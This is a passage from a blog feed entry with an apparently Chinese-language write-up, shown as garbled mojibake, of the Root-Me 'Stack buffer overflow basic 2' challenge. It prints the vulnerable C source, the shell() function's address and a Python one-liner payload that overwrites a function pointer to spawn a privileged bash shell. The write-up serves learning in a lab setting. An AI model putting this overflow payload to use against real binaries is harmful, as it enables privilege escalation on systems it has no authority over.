src="https://s3.ax1x.com/2020/11/14/DCSycj.jpg" alt="DCSycj.jpg"></a></p><p>è·å–è¾“å…¥åï¼Œè°ƒç”¨eaxå¯„å­˜å™¨ä¸­å‡½æ•°<br>è¾“å…¥å­˜åœ¨<code>ebp-0x8c</code>, <code>ebp-0xc</code> å¤„ä¿å­˜ç€supå‡½æ•°åœ°å€ï¼Œ æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†è¯¥åœ°å€æ¢ä¸ºshell()å‡½æ•°åœ°å€</p><h3 id="æŸ¥çœ‹å†…å­˜"><a href="#æŸ¥çœ‹å†…å­˜" class="headerlink" title="æŸ¥çœ‹å†…å­˜"></a>æŸ¥çœ‹å†…å­˜</h3><p><a href="https://imgchr.com/i/DCp9vd"><img src="https://s3.ax1x.com/2020/11/14/DCp9vd.jpg" alt="DCp9vd.jpg"></a></p><p>128å­—èŠ‚åï¼Œå³<code>0xbffffa9cï¼ˆebp-0xc)</code>å¤„ä¿å­˜sup()å‡½æ•°åœ°å€<br>æ‰€ä»¥å¯ä»¥ç›´æ¥æº¢å‡º</p><h3 id="æ›¿æ¢ä¸ºshell"><a href="#æ›¿æ¢ä¸ºshell" class="headerlink" title="æ›¿æ¢ä¸ºshell()"></a>æ›¿æ¢ä¸ºshell()</h3><p>æŸ¥çœ‹shell()å‡½æ•°åœ°å€<br><a href="https://imgchr.com/i/DCpgRe"><img src="https://s3.ax1x.com/2020/11/14/DCpgRe.jpg" alt="DCpgRe.jpg"></a><br>ä¸º<code>0x08048516</code></p><h3 id="palyload"><a href="#palyload" class="headerlink" title="palyload"></a>palyload</h3><p><code>(python -c &#39;print &quot;a&quot;*128+&quot;08048516&quot;.decode(&quot;hex&quot;)[::-1]&#39;;cat) | ./ch15</code><br>â€œ08048516â€.decode(â€œhexâ€) åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œæ‰€ä»¥ç”¨åå…­è¿›åˆ¶è§£ç </p><pre><code>â”Œâ”€[âœ—]â”€[zentreisender@parrotos]â”€[~/Documents/root_me/app_system]â””â”€â”€â•¼ $pythonPython 2.7.18 (default, Apr 20 2020, 20:30:41) [GCC 9.3.0] on linux2Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; &quot;08048516&quot;.decode(&quot;hex&quot;)&#39;\x08\x04\x85\x16&#39;&gt;&gt;&gt; &quot;08048516&quot;.encode(&quot;hex&quot;)&#39;3038303438353136&#39;&gt;&gt;&gt; </code></pre><p>æ³¨æ„pythonä¸­çš„<code>&#39;</code> <code>&quot;</code><br><a href="https://imgchr.com/i/DC9Ay9"><img src="https://s3.ax1x.com/2020/11/14/DC9Ay9.jpg" alt="DC9Ay9.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Stack-buffer-overflow-basic-2&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-2&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 2&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 2&lt;/h2&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    system(&lt;span class=&quot;string&quot;&gt;&amp;quot;/bin/bash&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;sup&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;Hey dude ! Waaaaazzaaaaaaaa ?!\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; var;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; (*func)()=sup;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;number&quot;&gt;128&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    fgets(buf,&lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;,&lt;span class=&quot;built_in&quot;&gt;stdin&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    func();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
</feed>
